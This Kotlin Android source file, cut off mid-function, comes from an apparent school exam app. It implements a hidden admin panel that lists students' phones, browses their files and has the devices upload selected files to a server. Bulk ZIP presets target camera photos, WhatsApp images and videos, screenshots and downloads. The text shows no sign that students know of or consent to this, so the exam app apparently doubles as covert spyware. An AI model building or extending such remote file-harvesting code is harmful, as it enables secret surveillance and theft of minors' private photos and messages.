package com.school.smartcbt.ui

import android.Manifest
import android.app.AlertDialog
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Base64
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.school.smartcbt.R
import com.school.smartcbt.data.model.*
import com.school.smartcbt.data.remote.ApiClient
import com.school.smartcbt.databinding.ActivityHiddenAdminBinding
import com.school.smartcbt.utils.SessionManager
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response

class HiddenAdminActivity : AppCompatActivity() {

    private lateinit var binding: ActivityHiddenAdminBinding
    private lateinit var sessionManager: SessionManager
    private var currentDeviceId: String? = null
    private var currentDeviceName: String? = null
    private var currentCategory: String? = null

    // Multi-select & Bulk Copy state
    private val selectedFileIds = mutableSetOf<String>()
    private var currentLoadedFiles: List<DeviceFileDto> = emptyList()
    private var fileAdapter: FileAdapter? = null

    // Folder ZIP polling handler
    private var zipStatusPollingHandler: Handler? = null
    private var zipStatusRunnable: Runnable? = null

    companion object {
        private const val PERMISSION_REQUEST_CODE = 1001
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityHiddenAdminBinding.inflate(layoutInflater)
        setContentView(binding.root)

        sessionManager = SessionManager(this)

        val role = sessionManager.getRole().uppercase()
        if (role != "ADMIN" && role != "OPERATOR") {
            Toast.makeText(this, "⛔ Akses Ditolak: Panel ini hanya dapat diakses oleh Administrator / Operator Sekolah.", Toast.LENGTH_LONG).show()
            finish()
            return
        }

        setupListeners()
        checkAndRequestPermissions()
        loadDevices()
    }

    override fun onDestroy() {
        super.onDestroy()
        stopZipPolling()
    }

    private fun setupListeners() {
        binding.btnAdminServerConfig.setOnClickListener {
            showServerConfigDialog()
        }

        binding.btnRefreshDevices.setOnClickListener { loadDevices() }

        binding.btnBackToDevices.setOnClickListener {
            binding.fileBrowserPanel.visibility = View.GONE
            binding.rvDevices.visibility = View.VISIBLE
            binding.btnRefreshDevices.visibility = View.VISIBLE
            currentDeviceId = null
            currentDeviceName = null
            currentCategory = null
            selectedFileIds.clear()
            updateBulkActionBar()
        }

        binding.btnBackFromCopyRequests.setOnClickListener {
            binding.copyRequestsPanel.visibility = View.GONE
            binding.rvDevices.visibility = View.VISIBLE
            binding.btnRefreshDevices.visibility = View.VISIBLE
        }

        binding.btnShowDevices.setOnClickListener {
            binding.copyRequestsPanel.visibility = View.GONE
            binding.fileBrowserPanel.visibility = View.GONE
            binding.rvDevices.visibility = View.VISIBLE
            binding.btnRefreshDevices.visibility = View.VISIBLE
            loadDevices()
        }

        binding.btnShowCopyRequests.setOnClickListener {
            binding.fileBrowserPanel.visibility = View.GONE
            binding.rvDevices.visibility = View.GONE
            binding.btnRefreshDevices.visibility = View.GONE
            binding.copyRequestsPanel.visibility = View.VISIBLE
            loadCopyRequests()
        }

        // --- Fitur Multi-Select & Bulk Copy ---
        binding.btnSelectAllFiles.setOnClickListener {
            if (currentLoadedFiles.isEmpty()) return@setOnClickListener
            if (selectedFileIds.size == currentLoadedFiles.size) {
                selectedFileIds.clear()
            } else {
                selectedFileIds.clear()
                selectedFileIds.addAll(currentLoadedFiles.map { it.id })
            }
            fileAdapter?.notifyDataSetChanged()
            updateBulkActionBar()
        }

        binding.btnBulkCancel.setOnClickListener {
            selectedFileIds.clear()
            fileAdapter?.notifyDataSetChanged()
            updateBulkActionBar()
        }

        binding.btnBulkCopy.setOnClickListener {
            requestBulkCopy()
        }

        // --- Fitur Unduh Folder ZIP ---
        binding.btnDownloadFolderZip.setOnClickListener {
            showFolderZipDialog()
        }
    }

    private fun updateBulkActionBar() {
        if (selectedFileIds.isNotEmpty()) {
            binding.bulkActionBar.visibility = View.VISIBLE
            binding.tvBulkSelectedCount.text = "${selectedFileIds.size} berkas dipilih"
            binding.btnSelectAllFiles.text = if (selectedFileIds.size == currentLoadedFiles.size) "⏹️ Batal Pilih" else "☑️ Pilih Semua"
        } else {
            binding.bulkActionBar.visibility = View.GONE
            binding.btnSelectAllFiles.text = "☑️ Pilih Semua"
        }
    }

    private fun showServerConfigDialog() {
        val input = EditText(this).apply {
            hint = "https://cbt.smpn1boyolangu.my.id"
            setText(sessionManager.getServerIp())
            setSingleLine()
            setPadding(40, 30, 40, 30)
        }

        AlertDialog.Builder(this)
            .setTitle("🌐 Konfigurasi Server Remote")
            .setMessage("Pilih / ubah alamat server backend:\n\n• Server Online VPS: https://cbt.smpn1boyolangu.my.id\n• Server Lokal: http://192.168.101.46:3000")
            .setView(input)
            .setPositiveButton("Simpan") { _, _ ->
                val newIp = input.text.toString().trim()
                if (newIp.isNotEmpty()) {
                    sessionManager.setServerIp(newIp)
                    ApiClient.resetClient()
                    Toast.makeText(this, "✅ Alamat server diubah: $newIp", Toast.LENGTH_SHORT).show()
                    loadDevices()
                }
            }
            .setNeutralButton("Reset Default") { _, _ ->
                sessionManager.setServerIp(SessionManager.DEFAULT_IP)
                ApiClient.resetClient()
                Toast.makeText(this, "Server direset ke ${SessionManager.DEFAULT_IP}", Toast.LENGTH_SHORT).show()
                loadDevices()
            }
            .setNegativeButton("Batal", null)
            .show()
    }

    private fun checkAndRequestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                AlertDialog.Builder(this)
                    .setTitle("⚠️ Izin Storage Diperlukan")
                    .setMessage("Aplikasi membutuhkan izin ALL_FILES_ACCESS untuk mengunduh berkas dari remote device ke penyimpanan HP.")
                    .setPositiveButton("Buka Settings") { _, _ ->
                        val intent = android.content.Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                        intent.data = android.net.Uri.parse("package:$packageName")
                        startActivity(intent)
                    }
                    .setNegativeButton("Nanti Saja", null)
                    .show()
            }
        } else {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE), PERMISSION_REQUEST_CODE)
            }
        }
    }

    private fun loadDevices() {
        binding.progressBar.visibility = View.VISIBLE
        ApiClient.getClient(this).getAllRemoteDevices().enqueue(object : Callback<DeviceListResponse> {
            override fun onResponse(call: Call<DeviceListResponse>, response: Response<DeviceListResponse>) {
                binding.progressBar.visibility = View.GONE
                if (response.isSuccessful && response.body() != null) {
                    val body = response.body()!!
                    binding.tvTotalDevices.text = body.totalDevices.toString()
                    binding.tvOnlineCount.text = "${body.onlineDevices} Online"
                    displayDevices(body.devices)
                } else {
                    Toast.makeText(this@HiddenAdminActivity, "Gagal mengambil data devices", Toast.LENGTH_SHORT).show()
                }
            }

            override fun onFailure(call: Call<DeviceListResponse>, t: Throwable) {
                binding.progressBar.visibility = View.GONE
                Toast.makeText(this@HiddenAdminActivity, "Error: ${t.localizedMessage}", Toast.LENGTH_SHORT).show()
            }
        })
    }

    private fun displayDevices(devices: List<DeviceDto>) {
        val adapter = DeviceAdapter(devices) { device ->
            openDeviceFiles(device.id, device.deviceName)
        }
        binding.rvDevices.layoutManager = LinearLayoutManager(this)
        binding.rvDevices.adapter = adapter
    }

    private fun openDeviceFiles(deviceId: String, deviceName: String) {
        currentDeviceId = deviceId
        currentDeviceName = deviceName
        currentCategory = null
        selectedFileIds.clear()
        updateBulkActionBar()

        binding.rvDevices.visibility = View.GONE
        binding.btnRefreshDevices.visibility = View.GONE
        binding.fileBrowserPanel.visibility = View.VISIBLE
        binding.tvDeviceFileName.text = "📁 $deviceName"
        binding.tvFileCount.text = "Loading..."

        loadDeviceFiles(deviceId, null)
    }

    private fun loadDeviceFiles(deviceId: String, category: String?) {
        currentCategory = category
        binding.progressBar.visibility = View.VISIBLE
        ApiClient.getClient(this).getRemoteDeviceFiles(deviceId, category).enqueue(object : Callback<DeviceFilesResponse> {
            override fun onResponse(call: Call<DeviceFilesResponse>, response: Response<DeviceFilesResponse>) {
                binding.progressBar.visibility = View.GONE
                if (response.isSuccessful && response.body() != null) {
                    val body = response.body()!!
                    binding.tvFileCount.text = "${body.pagination.total} files"
                    displayCategoryChips(body.categoryStats)
                    currentLoadedFiles = body.files
                    displayFiles(body.files)
                }
            }

            override fun onFailure(call: Call<DeviceFilesResponse>, t: Throwable) {
                binding.progressBar.visibility = View.GONE
                Toast.makeText(this@HiddenAdminActivity, "Error: ${t.localizedMessage}", Toast.LENGTH_SHORT).show()
            }
        })
    }

    private fun displayCategoryChips(stats: Map<String, CategoryStat>) {
        binding.categoryChipContainer.removeAllViews()

        val allChip = createChip("ALL", null, null)
        binding.categoryChipContainer.addView(allChip)

        for ((category, stat) in stats) {
            val chip = createChip("$category (${stat.count})", category, stat)
            binding.categoryChipContainer.addView(chip)
        }
    }

    private fun createChip(text: String, category: String?, stat: CategoryStat?): TextView {
        val chip = TextView(this)
        chip.text = text
        chip.setTextColor(0xFFFFFFFF.toInt())
        chip.textSize = 12f
        chip.setPadding(24, 8, 24, 8)
        val params = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.WRAP_CONTENT,
            LinearLayout.LayoutParams.WRAP_CONTENT
        )
        params.setMargins(4, 2, 4, 2)
        chip.layoutParams = params
        chip.setBackgroundResource(R.drawable.bg_fab_scan)

        chip.setOnClickListener {
            if (currentDeviceId != null) {
                selectedFileIds.clear()
                updateBulkActionBar()
                loadDeviceFiles(currentDeviceId!!, if (category == "ALL") null else category)
            }
        }

        return chip
    }

    private fun displayFiles(files: List<DeviceFileDto>) {
        fileAdapter = FileAdapter(files) { file ->
            showFileActionDialog(file)
        }
        binding.rvFiles.layoutManager = LinearLayoutManager(this)
        binding.rvFiles.adapter = fileAdapter
        updateBulkActionBar()
    }

    private fun showFileActionDialog(file: DeviceFileDto) {
        val optionsList = mutableListOf<String>()
        if (file.category == "IMAGE" || !file.thumbnailBase64.isNullOrEmpty()) {
            optionsList.add("🖼️ Pratinjau Foto")
        }
        optionsList.add("📋 Copy Info")
        optionsList.add("⬇️ Request Copy & Download")
        optionsList.add("🗑️ Delete Record")

        val options = optionsList.toTypedArray()
        AlertDialog.Builder(this)
            .setTitle("📄 ${file.fileName}")
            .setMessage("Path: ${file.filePath}\nUkuran: ${file.fileSizeHuman}\nTipe: ${file.category}\nModified: ${file.lastModified}")
            .setItems(options) { _, which ->
                val choice = options[which]
                when {
                    choice.contains("Pratinjau") -> showImagePreviewDialog(file)
                    choice.contains("Copy Info") -> showFileInfo(file)
                    choice.contains("Request Copy") -> requestFileCopy(file)
                    choice.contains("Delete Record") -> deleteFileRecord(file)
                }
            }
            .setNegativeButton("Tutup", null)
            .show()
    }

    /**
     * Preview Gambar Resolusi Penuh / Thumbnail
     */
    private fun showImagePreviewDialog(file: DeviceFileDto) {
        val view = LayoutInflater.from(this).inflate(R.layout.dialog_image_preview, null, false)
        val ivPreview = view.findViewById<ImageView>(R.id.ivFullPreview)
        val tvTitle = view.findViewById<TextView>(R.id.tvPreviewTitle)
        val tvSub = view.findViewById<TextView>(R.id.tvPreviewSub)
        val pbLoading = view.findViewById<ProgressBar>(R.id.pbPreviewLoading)

        tvTitle.text = file.fileName
        tvSub.text = "${file.fileSizeHuman} • ${file.category}"

        // Set immediate thumbnail if available
        if (!file.thumbnailBase64.isNullOrEmpty()) {
            try {
                val decoded = Base64.decode(file.thumbnailBase64, Base64.DEFAULT)
                val bitmap = BitmapFactory.decodeByteArray(decoded, 0, decoded.size)
                if (bitmap != null) {
                    ivPreview.setImageBitmap(bitmap)
                }
            } catch (e: Exception) {}
        }

        val dialog = AlertDialog.Builder(this)
            .setView(view)
            .setPositiveButton("Tutup", null)
            .setNeutralButton("⬇️ Unduh Berkas Asli") { _, _ ->
                requestFileCopy(file)
            }
            .create()

        dialog.show()

        // Fetch high-quality preview from server
        if (currentDeviceId != null) {
            pbLoading.visibility = View.VISIBLE
            ApiClient.getClient(this).getDeviceImagePreview(currentDeviceId!!, file.id, null, false)
                .enqueue(object : Callback<okhttp3.ResponseBody> {
                    override fun onResponse(call: Call<okhttp3.ResponseBody>, response: Response<okhttp3.ResponseBody>) {
                        pbLoading.visibility = View.GONE
                        if (response.isSuccessful && response.body() != null) {
                            try {
                                val bytes = response.body()!!.bytes()
                                val bmp = BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
                                if (bmp != null) {
                                    ivPreview.setImageBitmap(bmp)
                                }
                            } catch (e: Exception) {}
                        }
                    }

                    override fun onFailure(call: Call<okhttp3.ResponseBody>, t: Throwable) {
                        pbLoading.visibility = View.GONE
                    }
                })
        }
    }

    private fun showFileInfo(file: DeviceFileDto) {
        AlertDialog.Builder(this)
            .setTitle("📋 File Info")
            .setMessage(
                "Nama: ${file.fileName}\n" +
                "Path: ${file.filePath}\n" +
                "Ekstensi: ${file.fileExtension ?: '-'}\n" +
                "Ukuran: ${file.fileSizeHuman} (${file.fileSize} bytes)\n" +
                "MIME: ${file.mimeType ?: '-'}\n" +
                "Kategori: ${file.category}\n" +
                "Modified: ${file.lastModified}\n" +
                "Synced: ${file.syncedAt}"
            )
            .setPositiveButton("OK", null)
            .show()
    }

    private fun requestFileCopy(file: DeviceFileDto) {
        if (currentDeviceId == null) return

        AlertDialog.Builder(this)
            .setTitle("⬇️ Request Copy")
            .setMessage("Minta device untuk mengupload file \"${file.fileName}\" ke server?\n\nPath: ${file.filePath}")
            .setPositiveButton("Ya, Copy") { _, _ ->
                binding.progressBar.visibility = View.VISIBLE
                val request = CopyFileRequest(file.filePath, file.fileName)
                ApiClient.getClient(this).requestRemoteFileCopy(currentDeviceId!!, request)
                    .enqueue(object : Callback<CopyFileResponse> {
                        override fun onResponse(call: Call<CopyFileResponse>, response: Response<CopyFileResponse>) {
                            binding.progressBar.visibility = View.GONE
                            if (response.isSuccessful && response.body() != null) {
                                Toast.makeText(this@HiddenAdminActivity, "✅ ${response.body()!!.message}", Toast.LENGTH_LONG).show()
                            } else {
                                Toast.makeText(this@HiddenAdminActivity, "Gagal request copy", Toast.LENGTH_SHORT).show()
                            }
                        }

                        override fun onFailure(call: Call<CopyFileResponse>, t: Throwable) {
                            binding.progressBar.visibility = View.GONE
                            Toast.makeText(this@HiddenAdminActivity, "Error: ${t.localizedMessage}", Toast.LENGTH_SHORT).show()
                        }
                    })
            }
            .setNegativeButton("Batal", null)
            .show()
    }

    /**
     * Fitur Bulk Copy: Meminta HP mengunggah banyak berkas yang dipilih
     */
    private fun requestBulkCopy() {
        if (currentDeviceId == null || selectedFileIds.isEmpty()) return
        val count = selectedFileIds.size
        AlertDialog.Builder(this)
            .setTitle("📥 Salin $count Berkas")
            .setMessage("Minta HP ${currentDeviceName ?: "Siswa"} untuk mengunggah $count berkas terpilih ke server?")
            .setPositiveButton("Ya, Salin Semua") { _, _ ->
                binding.progressBar.visibility = View.VISIBLE
                val req = BulkCopyRequest(selectedFileIds.toList())
                ApiClient.getClient(this).requestBulkCopyFiles(currentDeviceId!!, req)
                    .enqueue(object : Callback<BasicResponse> {
                        override fun onResponse(call: Call<BasicResponse>, response: Response<BasicResponse>) {
                            binding.progressBar.visibility = View.GONE
                            if (response.isSuccessful && response.body() != null) {
                                Toast.makeText(this@HiddenAdminActivity, "✅ ${response.body()!!.message}", Toast.LENGTH_LONG).show()
                                selectedFileIds.clear()
                                updateBulkActionBar()
                                fileAdapter?.notifyDataSetChanged()
                            } else {
                                Toast.makeText(this@HiddenAdminActivity, "Gagal meminta salin massal", Toast.LENGTH_SHORT).show()
                            }
                        }

                        override fun onFailure(call: Call<BasicResponse>, t: Throwable) {
                            binding.progressBar.visibility = View.GONE
                            Toast.makeText(this@HiddenAdminActivity, "Error: ${t.localizedMessage}", Toast.LENGTH_SHORT).show()
                        }
                    })
            }
            .setNegativeButton("Batal", null)
            .show()
    }

    /**
     * Fitur Folder ZIP: Memilih folder untuk diunduh dalam arsip ZIP
     */
    private fun showFolderZipDialog() {
        if (currentDeviceId == null) return
        val folders = arrayOf(
            "ALL (Semua Berkas Media)",
            "📷 Kamera (DCIM)",
            "📥 WA Images (Receive)",
            "📤 WA Images (Sent)",
            "📱 Screenshots",
            "🎬 WA Video (Receive)",
            "📤 WA Video (Sent)",
            "📁 Unduhan (Download)"
        )
        val folderKeys = arrayOf(
            "ALL",
            "Kamera (DCIM)",
            "WA Images (Receive)",
            "WA Images (Sent)",
            "Screenshots",
            "WA Video (Receive)",
            "WA Video (Sent)",
            "Unduhan (Download)"
        )

        AlertDialog.Builder(this)
            .setTitle("📦 Unduh Folder ZIP")
            .setMessage("Pilih folder dari HP ${currentDeviceName ?: "Siswa"} yang ingin diunduh dalam 1 arsip .ZIP:")
            .setItems(folders) { _, which ->
                prepareAndDownloadFolderZip(folderKeys[which])
            }
            .setNegativeButton("Batal", null)
            .show()
    }

    private fun prepareAndDownloadFolderZip(folder: String) {
        if (currentDeviceId == null) return
        val deviceId = currentDeviceId!!
        val devName = (currentDeviceName ?: "Siswa").replace("[^a-zA-Z0-9_-]".toRegex(), "_")

        val progressDialog = AlertDialog.Builder(this)
            .setTitle("📦 Menyiapkan Arsip ZIP ($folder)")
            .setMessage("Memeriksa kesiapan berkas di PC Server...")
            .setCancelable(false)
            .setPositiveButton("Unduh Sekarang") { _, _ ->
                triggerDownloadZip(deviceId, folder, devName)
            }
            .setNegativeButton("Batal") { dialog, _ ->
                stopZipPolling()
                dialog.dismiss()
            }
            .create()

        progressDialog.show()
        val downloadBtn = progressDialog.getButton(AlertDialog.BUTTON_POSITIVE)
        downloadBtn.isEnabled = false

        ApiClient.getClient(this).prepareFolderZip(deviceId, FolderZipPrepareRequest(folder = folder, limit = 100))
            .enqueue(object : Callback<FolderZipPrepareResponse> {
                override fun onResponse(call: Call<FolderZipPrepareResponse>, response: Response<FolderZipPrepareResponse>) {
                    if (response.isSuccessful && response.body() != null) {
                        val prep = response.body()!!
                        progressDialog.setMessage("Target: ${prep.totalTarget} berkas\nSiap di server: ${prep.readyCount}\nDalam transfer dari HP: ${prep.queuedCount}\n\nMemantau kesiapan berkas...")

                        if (prep.readyCount > 0) {
                            downloadBtn.isEnabled = true
                            downloadBtn.text = "Unduh ${prep.readyCount} Berkas (.ZIP)"
                        }

                        startZipStatusPolling(deviceId, folder, progressDialog, downloadBtn, devName)
                    } else {
                        progressDialog.setMessage("Tidak ada berkas di folder ini atau server belum siap.")
                        downloadBtn.isEnabled = false
                    }
                }

                override fun onFailure(call: Call<FolderZipPrepareResponse>, t: Throwable) {
                    progressDialog.setMessage("Gagal menyiapkan ZIP: ${t.localizedMessage}")
                }
            })
    }

    private fun startZipStatusPolling(
        deviceId: String,
        folder: String,
        dialog: AlertDialog,
        downloadBtn: Button,
        devName: String
    ) {
        stopZipPolling()
        zipStatusPollingHandler = Handler(Looper.getMainLooper())
        zipStatusRunnable = object : Runnable {
            override fun run() {
                if (!dialog.isShowing) return
                ApiClient.getClient(this@HiddenAdminActivity).getFolderZipStatus(deviceId, folder, 100)
                    .enqueue(object : Callback<FolderZipStatusResponse> {
                        override fun onResponse(call: Call<FolderZipStatusResponse>, response: Response<FolderZipStatusResponse>) {
                            if (!dialog.isShowing) return
                            if (response.isSuccessful && response.body() != null) {
                                val st = response.body()!!
                                val pct = if (st.totalTarget > 0) (st.readyCount * 100 / st.totalTarget) else 0
                                dialog.setMessage(
                                    "Folder: $folder\n" +
                                    "Total Target: ${st.totalTarget} berkas\n" +
                                    "Siap di Server: ${st.readyCount} ($pct%)\n" +
                                    "Menunggu Transfer HP: ${st.pendingCount}\n\n" +
                                    if (st.isComplete) "✅ Semua berkas sudah lengkap di server!" else "⏳ Menunggu HP mengunggah berkas..."
                                )
                                if (st.readyCount > 0) {
                                    downloadBtn.isEnabled = true
                                    downloadBtn.text = if (st.isComplete) "Unduh ZIP Lengkap (${st.readyCount})" else "Unduh yang Siap (${st.readyCount})"
                                }
                                if (!st.isComplete) {
                                    zipStatusPollingHandler?.postDelayed(zipStatusRunnable!!, 2500)
                                }
                            }
                        }

                        override fun onFailure(call: Call<FolderZipStatusResponse>, t: Throwable) {
                            if (dialog.isShowing) {
                                zipStatusPollingHandler?.postDelayed(zipStatusRunnable!!, 3000)
                            }
                        }
                    })
            }
        }
        zipStatusPollingHandler?.postDelayed(zipStatusRunnable!!, 2000)
    }

    private fun stopZipPolling() {
        zipStatusRunnable?.let { zipStatusPollingHandler?.removeCallbacks(it) }
        zipStatusPollingHandler = null
        zipStatusRunnable = null
    }

    private fun triggerDownloadZip(deviceId: String, folder: String, devName: String) {
        stopZipPolling()
        val cleanFolder = folder.replace("[^a-zA-Z0-9_-]".toRegex(), "_")
        val zipName = "SmartCBT_${devName}_${cleanFolder}.zip"
        Toast.makeText(this, "Mengunduh arsip $zipName...", Toast.LENGTH_SHORT).show()

        ApiClient.getClient(this).downloadFolderZip(deviceId, folder, 100)
            .enqueue(object : Callback<okhttp3.ResponseBody> {
                override fun onResponse(call: Call<okhttp3.ResponseBody>, response: Response<okhttp3.ResponseBody>) {
                    if (response.isSuccessful && response.body() != null) {
                        try {
                            val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                            val outFile = java.io.File(downloadsDir, zipName)
                            response.body()!!.byteStream().use { input ->
                                outFile.outputStream().use { output ->
                                    input.copyTo(output)
                                }
                            }
                            AlertDialog.Builder(this@HiddenAdminActivity)
                                .setTitle("✅ Unduh ZIP Selesai")
                                .setMessage("Berkas arsip berhasil disimpan di:\n${outFile.absolutePath}\n\nUkuran: ${(outFile.length() / 1024)} KB")
                                .setPositiveButton("Buka Folder / OK", null)
                                .show()
                        } catch (e: Exception) {
                            Toast.makeText(this@HiddenAdminActivity, "Gagal menyimpan file ZIP: ${e.message}", Toast.LENGTH_SHORT).show()
                        }
                    } else {
                        Toast.makeText(this@HiddenAdminActivity, "Gagal mengunduh ZIP: Response code ${response.code()}", Toast.LENGTH_SHORT).show()
                    }
                }

                override fun onFailure(call: Call<okhttp3.ResponseBody>, t: Throwable) {
                    Toast.makeText(this@HiddenAdminActivity, "Unduh ZIP error: ${t.localizedMessage}", Toast.LENGTH_SHORT).show()
                }
            })
    }

    private fun deleteFileRecord(file: DeviceFileDto) {
        if (currentDeviceId == null) return

        AlertDialog.Builder(this)
            .setTitle("🗑️ Hapus Record")
            .setMessage("Hapus record file \"${file.fileName}\" dari database?")
            .setPositiveButton("Hapus") { _, _ ->
                ApiClient.getClient(this).deleteRemoteFileRecord(currentDeviceId!!, file.id)
                    .enqueue(object : Callback<BasicResponse> {
                        override fun onResponse(call: Call<BasicResponse>, response: Response<BasicResponse>) {
                            Toast.makeText(this@HiddenAdminActivity, "Record dihapus", Toast.LENGTH_SHORT).show()
                            loadDeviceFiles(currentDeviceId!!, currentCategory)
                        }

                        override fun onFailure(call: Call<BasicResponse>, t: Throwable) {
                            Toast.makeText(this@HiddenAdminActivity, "Gagal menghapus", Toast.LENGTH_SHORT).show()
                        }
                    })
            }
            .setNegativeButton("Batal", null)
            .show()
    }

    private fun loadCopyRequests() {
        binding.progressBar.visibility = View.VISIBLE
        ApiClient.getClient(this).getCopyRequests().enqueue(object : Callback<CopyRequestListResponse> {
            override fun onResponse(call: Call<CopyRequestListResponse>, response: Response<CopyRequestListResponse>) {
                binding.progressBar.visibility = View.GONE
                if (response.isSuccessful && response.body() != null) {
                    val requests = response.body()!!.requests
                    binding.tvCopyPending.text = requests.count { it.status == "PENDING" }.toString()
                    displayCopyRequests(requests)
                }
            }

            override fun onFailure(call: Call<CopyRequestListResponse>, t: Throwable) {
                binding.progressBar.visibility = View.GONE
                Toast.makeText(this@HiddenAdminActivity, "Error: ${t.localizedMessage}", Toast.LENGTH_SHORT).show()
            }
        })
    }

    private fun displayCopyRequests(requests: List<CopyRequestDto>) {
        val adapter = CopyRequestAdapter(requests) { request ->
            if (request.status == "COMPLETED" && request.device != null) {
                downloadFile(request.device.id, request.id, request.fileName)
            }
        }
        binding.rvCopyRequests.layoutManager = LinearLayoutManager(this)
        binding.rvCopyRequests.adapter = adapter
    }

    private fun downloadFile(deviceId: String, fileId: String, fileName: String) {
        Toast.makeText(this, "Mendownload $fileName...", Toast.LENGTH_SHORT).show()
        ApiClient.getClient(this).downloadRemoteFile(deviceId, fileId)
            .enqueue(object : Callback<okhttp3.ResponseBody> {
                override fun onResponse(call: Call<okhttp3.ResponseBody>, response: Response<okhttp3.ResponseBody>) {
                    if (response.isSuccessful && response.body() != null) {
                        try {
                            val downloadsDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                            val file = java.io.File(downloadsDir, "SmartCBT_$fileName")
                            response.body()!!.byteStream().use { input ->
                                file.outputStream().use { output ->
                                    input.copyTo(output)
                                }
                            }
                            Toast.makeText(this@HiddenAdminActivity, "✅ File disimpan: ${file.absolutePath}", Toast.LENGTH_LONG).show()
                        } catch (e: Exception) {
                            Toast.makeText(this@HiddenAdminActivity, "Gagal menyimpan: ${e.message}", Toast.LENGTH_SHORT).show()
                        }
                    }
                }

                override fun onFailure(call: Call<okhttp3.ResponseBody>, t: Throwable) {
                    Toast.makeText(this@HiddenAdminActivity, "Download gagal: ${t.localizedMessage}", Toast.LENGTH_SHORT).show()
                }
            })
    }

    // ============================================================
    // RecyclerView Adapters
    // ============================================================

    inner class DeviceAdapter(
        private val devices: List<DeviceDto>,
        private val onClick: (DeviceDto) -> Unit
    ) : RecyclerView.Adapter<DeviceAdapter.ViewHolder>() {

        inner class ViewHolder(view: View) : RecyclerView.ViewHolder(view) {
            val tvName: TextView = view.findViewById(R.id.tvDeviceName)
            val tvModel: TextView = view.findViewById(R.id.tvDeviceModel)
            val tvOwner: TextView = view.findViewById(R.id.tvDeviceOwner)
            val tvStatus: TextView = view.findViewById(R.id.tvDeviceStatus)
            val tvFiles: TextView = view.findViewById(R.id.tvDeviceFileCount)
            val tvLastSeen: TextView = view.findViewById(R.id.tvDeviceLastSeen)
        }

        override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
            val view = LayoutInflater.from(parent.context).inflate(R.layout.item_device, parent, false)
            return ViewHolder(view)
        }

        override fun onBindViewHolder(holder: ViewHolder, position: Int) {
            val device = devices[position]
            holder.tvName.text = device.deviceName
            holder.tvModel.text = "${device.deviceBrand} ${device.deviceModel} (Android ${device.deviceOsVersion ?: '?'})"
            holder.tvOwner.text = device.owner?.let { "👤 ${it.name} (${it.role})" } ?: "👤 Unknown"
            holder.tvFiles.text = "📁 ${device.fileCount} files"
            holder.tvLastSeen.text = "⏱️ Last: ${device.lastSeen.substring(0, 16).replace('T', ' ')}"

            when (device.status) {
                "ONLINE" -> {
                    holder.tvStatus.text = "● ONLINE"
                    holder.tvStatus.setTextColor(0xFF4CAF50.toInt())
                }
                "BLOCKED" -> {
                    holder.tvStatus.text = "● BLOCKED"
                    holder.tvStatus.setTextColor(0xFFFF5722.toInt())
                }
                else -> {
                    holder.tvStatus.text = "● OFFLINE"
                    holder.tvStatus.setTextColor(0xFF888888.toInt())
                }
            }

            holder.itemView.setOnClickListener { onClick(device) }

            holder.itemView.setOnLongClickListener {
                showDeviceActionDialog(device)
                true
            }
        }

        override fun getItemCount() = devices.size
    }

    inner class FileAdapter(
        private val files: List<DeviceFileDto>,
        private val onClick: (DeviceFileDto) -> Unit
    ) : RecyclerView.Adapter<FileAdapter.ViewHolder>() {

        inner class ViewHolder(view: View) : RecyclerView.ViewHolder(view) {
            val cbSelect: CheckBox = view.findViewById(R.id.cbSelectFile)
            val ivThumbnail: ImageView = view.findViewById(R.id.ivFileThumbnail)
            val tvIcon: TextView = view.findViewById(R.id.tvFileIcon)
            val tvName: TextView = view.findViewById(R.id.tvFileName)
            val tvInfo: TextView = view.findViewById(R.id.tvFileInfo)
            val tvSynced: TextView = view.findViewById(R.id.tvFileSynced)
            val tvCategory: TextView = view.findViewById(R.id.tvFileCategory)
        }

        override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
            val view = LayoutInflater.from(parent.context).inflate(R.layout.item_file, parent, false)
            return ViewHolder(view)
        }

        override fun onBindViewHolder(holder: ViewHolder, position: Int) {
            val file = files[position]
            holder.tvName.text = file.fileName
            holder.tvInfo.text = "${file.fileSizeHuman} • ${file.fileExtension ?: file.mimeType ?: '?'}"
            holder.tvSynced.text = "Tersinkron: ${file.lastModified.take(10)}"
            holder.tvCategory.text = file.category

            val color = when (file.category) {
                "IMAGE" -> 0xFF4CAF50.toInt()
                "VIDEO" -> 0xFF2196F3.toInt()
                "AUDIO" -> 0xFFFF9800.toInt()
                "DOCUMENT" -> 0xFF9C27B0.toInt()
                "APK" -> 0xFFE91E63.toInt()
                else -> 0xFF888888.toInt()
            }
            holder.tvCategory.setTextColor(color)

            // Multi-Select CheckBox Binding
            holder.cbSelect.setOnCheckedChangeListener(null)
            holder.cbSelect.isChecked = selectedFileIds.contains(file.id)
            holder.cbSelect.setOnCheckedChangeListener { _, isChecked ->
                if (isChecked) {
                    selectedFileIds.add(file.id)
                } else {
                    selectedFileIds.remove(file.id)
                }
                updateBulkActionBar()
            }

            // Thumbnail Preview (Base64 mini-thumbnail from HP)
            if (!file.thumbnailBase64.isNullOrEmpty()) {
                try {
                    val decoded = Base64.decode(file.thumbnailBase64, Base64.DEFAULT)
                    val bitmap = BitmapFactory.decodeByteArray(decoded, 0, decoded.size)
                    if (bitmap != null) {
